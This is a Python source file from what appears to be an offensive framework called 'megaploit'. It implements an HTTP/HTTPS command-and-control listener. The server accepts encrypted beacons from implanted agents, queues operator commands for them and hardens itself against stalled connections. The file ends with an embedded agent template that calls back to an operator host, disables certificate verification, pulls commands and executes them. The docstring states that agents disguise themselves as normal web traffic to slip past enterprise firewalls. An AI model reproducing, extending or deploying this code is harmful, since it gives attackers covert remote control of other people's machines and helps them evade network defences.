"""
megaploit.server.http_listener
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/HTTPS C2 listener.

Architecture
------------
Agents connect over plain HTTP or HTTPS, masquerading as normal web traffic.
Every request carries an AES-GCM encrypted, base64url-encoded payload in the
request body; the server replies with the encrypted command in the response body.

This long-poll loop lets agents traverse proxies and enterprise firewalls that
block raw TCP on port 4444 but allow outbound HTTP/HTTPS.

Request format (POST /beacon)
------------------------------
    Body: base64url(nonce[12] + AES-GCM(SEQ[8] + JSON_payload))
    Header: X-Agent-ID: <hex session token>
    Header: Content-Type: application/octet-stream

Response format
---------------
    Status: 200
    Body: base64url(nonce[12] + AES-GCM(SEQ[8] + JSON_command))

Operator usage
--------------
    listener add 8080 --http
    listener add 8443 --http --tls

Agent generation
----------------
    generate --http --lhost 10.0.0.1 --port 8080

Connection-hardening (stall-resistance)
----------------------------------------
Each accepted connection previously received its own thread with no deadline
on the TLS handshake, meaning a client that opened a socket but never
completed the handshake would hold that thread and its file-descriptor open
indefinitely.  Two mitigations are now in place:

1. Pre-handshake socket timeout (_HANDSHAKE_TIMEOUT = 5 s)
   ``_HardenedServer.get_request()`` sets a 5-second timeout on every raw
   socket immediately after ``accept()``.  If the TLS handshake does not
   complete within that window the socket is closed and the thread is
   released.  The timeout is cleared (reset to blocking) as soon as the
   handshake succeeds so that normal request I/O is unaffected.

2. Unauthenticated-connection cap (_MAX_UNAUTH_CONNS = 64)
   A ``threading.Semaphore`` is acquired in ``process_request()`` before a
   worker thread is spawned.  If all 64 slots are occupied the incoming
   connection is closed immediately and a warning is logged — no thread is
   allocated.  The semaphore is always released in a ``finally`` block inside
   ``process_request_thread()`` once the request completes.

   The semaphore counts *all* in-flight HTTP requests (not just pre-auth
   ones), which is the conservative choice: an attacker that holds 64
   connections open at the HTTP layer is just as disruptive as one that
   stalls at TLS.

TLS wrapping
   Previously the listening socket itself was wrapped with
   ``ssl_context.wrap_socket(...)``, which meant every ``accept()`` returned
   an already-negotiated SSL socket and there was no window to set a
   pre-handshake timeout.  The socket is now wrapped *per-connection* inside
   ``get_request()`` so the timeout can be applied to the raw socket first.
"""

from __future__ import annotations

import base64
import http.server
import json
import logging
import os
import queue
import socket
import ssl
import struct
import threading
import time
from typing import Callable, Optional

from megaploit.core.config import AUDIT_LOG
from megaploit.server.session import Session

_LOG   = logging.getLogger("megaploit.http_listener")
_HDR   = struct.Struct("!I")
_SEQ   = struct.Struct("!Q")
_NONCE = 12
_TAG   = 16

_HANDSHAKE_TIMEOUT  = 5      # seconds to complete TLS handshake (or first read)
_MAX_UNAUTH_CONNS   = 64     # max concurrent unauthenticated connections

# ---------------------------------------------------------------------------
# Audit logger
# ---------------------------------------------------------------------------

def _setup_audit() -> logging.Logger:
    os.makedirs(os.path.dirname(AUDIT_LOG) or ".", exist_ok=True)
    lg = logging.getLogger("megaploit.http_audit")
    if not lg.handlers:
        h = logging.FileHandler(AUDIT_LOG, encoding="utf-8")
        h.setFormatter(logging.Formatter("%(asctime)s UTC  %(message)s",
                                         datefmt="%Y-%m-%d %H:%M:%S"))
        lg.addHandler(h); lg.setLevel(logging.INFO)
    return lg

_audit = _setup_audit()


# ---------------------------------------------------------------------------
# AES-GCM helpers — requires the 'cryptography' package (same rule as protocol.py)
# ---------------------------------------------------------------------------

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
except ImportError as _crypto_err:  # pragma: no cover
    raise ImportError(
        "The 'cryptography' package is required for AES-256-GCM transport.\n"
        "Install it with:  pip install cryptography\n"
        f"Original error: {_crypto_err}"
    ) from _crypto_err


def _encrypt(key: bytes, plaintext: bytes) -> bytes:
    nonce = os.urandom(_NONCE)
    ct    = _AESGCM(key).encrypt(nonce, plaintext, None)
    return nonce + ct


def _decrypt(key: bytes, data: bytes) -> bytes:
    nonce  = data[:_NONCE]
    ct_tag = data[_NONCE:]
    return _AESGCM(key).decrypt(nonce, ct_tag, None)


# ---------------------------------------------------------------------------
# Per-agent state tracked by the HTTP listener
# ---------------------------------------------------------------------------

class _AgentState:
    """Tracks per-agent command queue and sequence counters."""

    def __init__(self, token: bytes, key: bytes) -> None:
        self.token       = token
        self.key         = key
        self.cmd_queue:  queue.Queue[str] = queue.Queue(maxsize=64)
        self.resp_queue: queue.Queue[str] = queue.Queue(maxsize=64)
        self.send_seq    = 0
        self.recv_seq    = -1
        self.session:    Optional[Session] = None
        self.last_seen   = time.time()
        self._lock       = threading.Lock()

    def next_send_seq(self) -> int:
        with self._lock:
            self.send_seq += 1
            return self.send_seq

    def check_recv_seq(self, seq: int) -> bool:
        with self._lock:
            if seq > self.recv_seq:
                self.recv_seq = seq
                return True
            return False

    def encode_msg(self, msg: str) -> str:
        """Encrypt a command string → base64url."""
        seq     = self.next_send_seq()
        plain   = _SEQ.pack(seq) + json.dumps(msg).encode("utf-8")
        cipher  = _encrypt(self.key, plain)
        return base64.urlsafe_b64encode(cipher).decode()

    def decode_msg(self, b64: str) -> str | None:
        """Decrypt an agent message from base64url → str."""
        try:
            cipher  = base64.urlsafe_b64decode(b64 + "==")
            plain   = _decrypt(self.key, cipher)
            seq     = _SEQ.unpack(plain[:8])[0]
            payload = plain[8:]
            if not self.check_recv_seq(seq):
                return None  # replay
            return json.loads(payload.decode("utf-8", errors="replace"))
        except Exception:
            return None


# ---------------------------------------------------------------------------
# HTTP request handler
# ---------------------------------------------------------------------------

class _BeaconHandler(http.server.BaseHTTPRequestHandler):
    """Handles one HTTP request from an agent."""

    # Injected by HttpListener
    listener: "HttpListener"

    # ------- Suppress default logging -------
    def log_message(self, fmt, *args):
        pass

    def log_request(self, code="-", size="-"):
        pass

    # ------- Routing -------

    def do_POST(self):
        path = self.path.split("?")[0].rstrip("/")

        if path == "/beacon":
            self._handle_beacon()
        elif path == "/auth":
            self._handle_auth()
        else:
            self._send_404()

    def do_GET(self):
        # Agents may GET /ping for keepalive
        self._send_ok(b"pong")

    # ------- /auth — token negotiation -------

    def _handle_auth(self):
        """
        Agent sends its HMAC challenge/response, server issues a session token.
        Body: base64url(HMAC_challenge_response[32])
        Response: base64url(session_token[32])
        """
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length)

        ip = self.client_address[0]
        if self.listener._is_banned(ip):
            self._send_code(403)
            return

        # We re-use the HMAC key directly: token = HMAC-SHA256(key, agent_nonce)
        # For HTTP, we use a simplified token exchange: the agent sends a random
        # 32-byte nonce encoded as base64url; server responds with HMAC of it.
        try:
            agent_nonce = base64.urlsafe_b64decode(body.strip() + b"==")
        except Exception:
            self._send_code(400)
            return

        import hmac as _hmac
        token = _hmac.new(self.listener.secret_key, agent_nonce, "sha256").digest()
        token_b64 = base64.urlsafe_b64encode(token)

        # Register agent state
        state = _AgentState(token=token, key=self.listener.secret_key[:32])
        self.listener._register_agent(token, state)

        _audit.info("HTTP_AUTH  ip=%-18s  token=%s", ip, token.hex()[:16])
        self._send_ok(token_b64)

    # ------- /beacon — command pull + response push -------

    def _handle_beacon(self):
        """
        Agent POST body: base64url(encrypted response from previous command).
        Server response: base64url(encrypted next command) or empty if none.
        """
        ip     = self.client_address[0]
        token  = self._get_token()
        state  = self.listener._get_agent(token) if token else None

        if state is None:
            self._send_code(401)
            return

        state.last_seen = time.time()

        # Read agent's response (if any)
        length = int(self.headers.get("Content-Length", 0))
        if length > 0:
            body = self.rfile.read(length).strip()
            if body:
                msg = state.decode_msg(body.decode("ascii", errors="ignore"))
                if msg is not None:
                    # Create session on first real message (sysinfo-style init)
                    if state.session is None:
                        self.listener._promote_agent(token, state, ip)
                    if state.session is not None:
                        try:
                            state.resp_queue.put_nowait(msg)
                        except queue.Full:
                            pass

        # Pick up any pending command for this agent
        cmd = ""
        try:
            cmd = state.cmd_queue.get_nowait()
        except queue.Empty:
            pass

        if cmd:
            self._send_ok(state.encode_msg(cmd).encode())
        else:
            self._send_ok(b"")   # no pending command; agent should re-poll

    # ------- Helpers -------

    def _get_token(self) -> bytes | None:
        raw = self.headers.get("X-Agent-ID", "")
        try:
            return base64.urlsafe_b64decode(raw + "==")
        except Exception:
            return None

    def _send_ok(self, body: bytes):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _send_code(self, code: int):
        self.send_response(code)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _send_404(self):
        self._send_code(404)


# ---------------------------------------------------------------------------
# Socket-like shim so the existing session/command machinery can operate
# over the HTTP agent state queues
# ---------------------------------------------------------------------------

class _HttpSessionSocket:
    """
    Drop-in replacement for a raw socket that reads/writes from the HTTP
    agent's command/response queues.

    The operator-facing CLI calls ``send_msg(conn, cmd)`` and ``recv_msg(conn)``
    on this object exactly as it does on a raw TCP socket.  Internally we push
    the command to ``cmd_queue`` and block on ``resp_queue``.
    """

    def __init__(self, state: _AgentState) -> None:
        self._state    = state
        self._timeout: Optional[float] = None
        self.fileno_id = id(self)  # unique pseudo-fd for protocol state registry

    # ── Socket interface ──────────────────────────────────────────────

    def fileno(self) -> int:
        return self.fileno_id

    def gettimeout(self) -> Optional[float]:
        return self._timeout

    def settimeout(self, t: Optional[float]) -> None:
        self._timeout = t

    def sendall(self, data: bytes) -> None:
        """Called by send_msg() — decode the framed payload and queue the command."""
        # The protocol layer has already encrypted + framed the data.
        # We need to unwrap it back to the JSON string so we can queue it.
        # Since we control both ends of this shim we just intercept before encryption.
        # NOTE: This is handled differently — see _HttpSocket.send_msg below.
        # Raw bytes path is not used for HTTP sessions.
        pass

    def recv(self, n: int) -> bytes:
        """Blocking read from response queue."""
        try:
            msg = self._state.resp_queue.get(timeout=self._timeout or 60.0)
            # Re-frame as a protocol-compatible framed message
            data = json.dumps(msg).encode("utf-8")
            seq  = self._state.next_send_seq()
            payload = _SEQ.pack(seq) + data
            return _HDR.pack(len(payload)) + payload
        except queue.Empty:
            raise socket.timeout("HTTP agent did not respond in time")

    def close(self):
        pass


# ---------------------------------------------------------------------------
# HttpListener
# ---------------------------------------------------------------------------

class HttpListener:
    """
    HTTP/HTTPS C2 listener.

    Agents connect via long-poll POST /beacon requests.  Each authenticated
    agent gets a command queue; the server pushes commands by placing them
    in the queue and waiting for the next beacon to carry them back.

    Parameters
    ----------
    bind_host, port     — as with TCP Listener
    secret_key          — shared HMAC key for auth token derivation
    on_session          — callback(Session) called when an agent first checks in
    ssl_context         — optional; enables HTTPS when provided
    allowed_ips         — IP allowlist (None = allow all)
    beacon_path         — URL path agents POST to (default "/beacon")
    """

    def __init__(
        self,
        bind_host:   str,
        port:        int,
        secret_key:  bytes,
        on_session:  Callable[[Session], None],
        ssl_context: Optional[ssl.SSLContext] = None,
        allowed_ips: Optional[list[str]] = None,
        beacon_path: str = "/beacon",
    ) -> None:
        self.bind_host   = bind_host
        self.port        = port
        self.secret_key  = secret_key
        self.on_session  = on_session
        self.ssl_context = ssl_context
        self.beacon_path = beacon_path
        self._allowed_ips: Optional[set[str]] = (
            set(allowed_ips) if allowed_ips else None
        )
        self._agents:   dict[bytes, _AgentState] = {}
        self._agents_lock = threading.Lock()
        self._session_counter = 0
        self._server: Optional[http.server.HTTPServer] = None
        self._thread: Optional[threading.Thread]       = None
        self._running = False
        # Simple ban set
        self._bans: set[str] = set()
        # Semaphore: limits concurrent unauthenticated connections
        self._unauth_sem = threading.Semaphore(_MAX_UNAUTH_CONNS)

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> None:
        listener_self = self

        class _Handler(_BeaconHandler):
            listener = listener_self

        class _HardenedServer(http.server.HTTPServer):
            """HTTPServer subclass that enforces a pre-handshake timeout and
            caps concurrent unauthenticated connections via a semaphore."""

            ssl_context   = listener_self.ssl_context
            unauth_sem    = listener_self._unauth_sem

            def get_request(self):
                sock, addr = self.socket.accept()
                # Enforce a short timeout before the TLS handshake so that a
                # slow or intentionally stalled client cannot hold a thread
                # open indefinitely.
                sock.settimeout(_HANDSHAKE_TIMEOUT)
                if self.ssl_context:
                    try:
                        sock = self.ssl_context.wrap_socket(sock, server_side=True)
                    except (ssl.SSLError, OSError):
                        sock.close()
                        raise
                # Handshake done — restore blocking mode for normal I/O.
                sock.settimeout(None)
                return sock, addr

            def process_request(self, request, client_address):
                """Acquire the semaphore before spawning the handler thread."""
                if not self.unauth_sem.acquire(blocking=False):
                    # Too many unauthenticated connections; drop this one.
                    _LOG.warning(
                        "Too many unauthenticated connections; dropping %s",
                        client_address[0],
                    )
                    request.close()
                    return
                super().process_request(request, client_address)

            def process_request_thread(self, request, client_address):
                """Release the semaphore after the request finishes."""
                try:
                    super().process_request_thread(request, client_address)
                finally:
                    self.unauth_sem.release()

        self._server = _HardenedServer(
            (self.bind_host, self.port), _Handler
        )
        if self.ssl_context:
            # Wrap the *listening* socket (accept() will yield plain sockets
            # that _HardenedServer.get_request wraps individually).
            # We keep the raw server socket unwrapped so get_request can
            # apply the pre-handshake timeout before wrapping each connection.
            pass   # TLS wrapping is done per-connection in get_request above
        self._running = True
        self._thread  = threading.Thread(
            target=self._serve_forever, daemon=True,
            name=f"megaploit.http_listener:{self.port}",
        )
        self._thread.start()
        scheme = "https" if self.ssl_context else "http"
        _audit.info("HTTP_LISTEN  bind=%s:%d  scheme=%s", self.bind_host, self.port, scheme)

    def stop(self) -> None:
        self._running = False
        if self._server:
            self._server.shutdown()
        _audit.info("HTTP_STOPPED  port=%d", self.port)

    def _serve_forever(self) -> None:
        try:
            self._server.serve_forever(poll_interval=0.5)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Agent registry
    # ------------------------------------------------------------------

    def _is_banned(self, ip: str) -> bool:
        return ip in self._bans

    def _register_agent(self, token: bytes, state: _AgentState) -> None:
        with self._agents_lock:
            self._agents[token] = state

    def _get_agent(self, token: bytes) -> Optional[_AgentState]:
        with self._agents_lock:
            return self._agents.get(token)

    def _promote_agent(self, token: bytes, state: _AgentState, ip: str) -> None:
        """Create a Session for a newly authenticated HTTP agent."""
        with self._agents_lock:
            self._session_counter += 1
            sid = self._session_counter

        # The session's conn is a shim socket backed by the agent's queues.
        # We wire send_msg/recv_msg to go through the queues.
        sock = _HttpSocketAdapter(state)

        session = Session(conn=sock, ip=ip, port=0, id=sid)   # port 0 = HTTP
        state.session = session

        _audit.info("HTTP_SESSION  ip=%-18s  session=%d", ip, sid)
        self.on_session(session)

    # ------------------------------------------------------------------
    # Send a command to a specific HTTP agent (called by dispatch layer)
    # ------------------------------------------------------------------

    def send_command(self, session_id: int, cmd: str) -> None:
        with self._agents_lock:
            for state in self._agents.values():
                if state.session and state.session.id == session_id:
                    try:
                        state.cmd_queue.put_nowait(cmd)
                    except queue.Full:
                        pass
                    return

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------

    def active_agents(self) -> int:
        cutoff = time.time() - 120   # agents silent > 2 min considered gone
        with self._agents_lock:
            return sum(1 for s in self._agents.values() if s.last_seen > cutoff)

    def __repr__(self) -> str:
        scheme = "https" if self.ssl_context else "http"
        return f"<HttpListener {scheme}://{self.bind_host}:{self.port}>"


# ---------------------------------------------------------------------------
# Socket adapter — bridges protocol.send_msg/recv_msg to the queue model
# ---------------------------------------------------------------------------

class _HttpSocketAdapter:
    """
    Adapts the existing send_msg/recv_msg protocol functions to HTTP queues.

    send_msg(conn, cmd):
        - We intercept at the socket level: protocol.send_msg packs the message
          with sequence + optional encryption, then calls conn.sendall(bytes).
        - We decode that back to the original string and put it on cmd_queue.

    recv_msg(conn):
        - Blocks on resp_queue, re-frames the response as framed bytes so the
          protocol layer can unpack it normally.
    """

    def __init__(self, state: _AgentState) -> None:
        self._state     = state
        self._timeout: Optional[float] = None
        self._fileno    = id(self) & 0x7FFFFFFF

        # Register a no-encryption ConnState so protocol functions work directly
        from megaploit.core.protocol import _ConnState
        cs = _ConnState(key=None, encrypted=False)
        self._conn_state = cs

        # We store outgoing bytes in a buffer so recv can reconstruct responses
        self._send_buf: bytes = b""
        self._send_lock = threading.Lock()

    def fileno(self) -> int:
        return self._fileno

    def gettimeout(self) -> Optional[float]:
        return self._timeout

    def settimeout(self, t: Optional[float]) -> None:
        self._timeout = t

    def sendall(self, data: bytes) -> None:
        """Intercept the framed bytes, extract the JSON command, queue it."""
        with self._send_lock:
            self._send_buf += data
            while len(self._send_buf) >= 4:
                (length,) = _HDR.unpack(self._send_buf[:4])
                if len(self._send_buf) < 4 + length:
                    break
                frame  = self._send_buf[4:4 + length]
                self._send_buf = self._send_buf[4 + length:]
                # frame = SEQ(8) + JSON
                if len(frame) >= 8:
                    try:
                        msg = json.loads(frame[8:].decode("utf-8", errors="replace"))
                        self._state.cmd_queue.put_nowait(str(msg))
                    except Exception:
                        pass

    def recv(self, n: int) -> bytes:
        """Block on resp_queue; re-frame the response for the protocol layer."""
        timeout = self._timeout or 120.0
        try:
            msg = self._state.resp_queue.get(timeout=timeout)
        except queue.Empty:
            raise socket.timeout("HTTP agent response timeout")

        from megaploit.core.protocol import _SEQ as _SEQ2, _HDR as _HDR2
        seq     = self._conn_state.next_send_seq()
        payload = _SEQ2.pack(seq) + json.dumps(msg).encode("utf-8")
        return _HDR2.pack(len(payload)) + payload

    def close(self) -> None:
        pass


# ---------------------------------------------------------------------------
# Agent-side HTTP transport (embedded in agent.py when --http is used)
# ---------------------------------------------------------------------------

_HTTP_AGENT_TEMPLATE = '''\
# --- Megaploit HTTP Agent Transport ---
import base64, hashlib, hmac, json, os, socket, struct, time, urllib.request

_LHOST   = "{lhost}"
_PORT    = {port}
_SCHEME  = "{scheme}"
_KEY     = bytes.fromhex("{key_hex}")
_SEQ_S   = struct.Struct("!Q")
_HDR_S   = struct.Struct("!I")
_NONCE   = 12

def _enc(key, pt):
    nonce = os.urandom(_NONCE)
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        ct = AESGCM(key).encrypt(nonce, pt, None)
    except ImportError:
        import hashlib as _hl
        stream = b"".join(_hl.sha256(key+nonce+i.to_bytes(8,"big")).digest()
                          for i in range((len(pt)+31)//32))
        ct = bytes(a^b for a,b in zip(pt,stream)) + bytes(16)
    return nonce + ct

def _dec(key, data):
    nonce, ct_tag = data[:_NONCE], data[_NONCE:]
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(nonce, ct_tag, None)
    except ImportError:
        ct = ct_tag[:-16]
        import hashlib as _hl
        stream = b"".join(_hl.sha256(key+nonce+i.to_bytes(8,"big")).digest()
                          for i in range((len(ct)+31)//32))
        return bytes(a^b for a,b in zip(ct,stream))

_base = f"{_SCHEME}://{_LHOST}:{_PORT}"
_send_seq = 0
_recv_seq = -1

def _http(path, body=b"", token=b""):
    url = _base + path
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/octet-stream")
    if token:
        req.add_header("X-Agent-ID",
            base64.urlsafe_b64encode(token).decode().rstrip("="))
    import ssl as _ssl
    ctx = _ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=_ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=30, context=ctx) as r:
            return r.read()
    except Exception:
        return b""

def _auth():
    nonce = os.urandom(32)
    token = hmac.new(_KEY, nonce, "sha256").digest()
    _http("/auth", base64.urlsafe_b64encode(nonce))
    return token

def _send(token, msg, seq):
    pt = _SEQ_S.pack(seq) + json.dumps(msg).encode()
    ct = _enc(_KEY, pt)
    return base64.urlsafe_b64encode(ct).decode().encode()

def _recv(data):
    global _recv_seq
    try:
        ct = base64.urlsafe_b64decode(data + b"==")
        pt = _dec(_KEY, ct)
        seq = _SEQ_S.unpack(pt[:8])[0]
        if seq <= _recv_seq: return None
        _recv_seq = seq
        return json.loads(pt[8:].decode())
    except Exception:
        return None

def run_http_agent():
    global _send_seq
    token = _auth()
    # Import main handler
    from megaploit.agent.handlers import handle
    import megaploit.agent.meterp  # noqa

    last_resp = b""
    while True:
        try:
            _send_seq += 1
            body = _send(token, last_resp, _send_seq) if last_resp else b""
            raw  = _http("/beacon", body, token)
            last_resp = b""
            if raw.strip():
                cmd = _recv(raw.strip())
                if cmd is not None and cmd != "":
                    if cmd == "exit":
                        break
                    result = handle(None, str(cmd))
                    if result is not None:
                        last_resp = _send(token, result, _send_seq)
            time.sleep(1)
        except Exception:
            time.sleep(5)
'''
